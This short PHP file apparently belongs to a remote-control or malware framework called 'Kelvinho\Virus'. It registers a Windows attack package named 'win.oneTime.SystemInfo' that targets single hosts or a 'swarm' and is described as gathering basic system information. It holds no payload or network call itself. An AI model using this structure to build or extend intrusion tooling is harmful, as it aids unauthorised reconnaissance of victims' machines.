<?php

use Kelvinho\Virus\Attack\Classes;

/** @var \Kelvinho\Virus\Attack\PackageRegistrar $packageRegistrar */

$packageRegistrar->iRegister("win.oneTime.SystemInfo", "\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\SystemInfo\\SystemInfo", "easy.SystemInfo", __DIR__, [Classes::WINDOWS_ALONE, Classes::WINDOWS_SWARM], "Get some basic system information.");
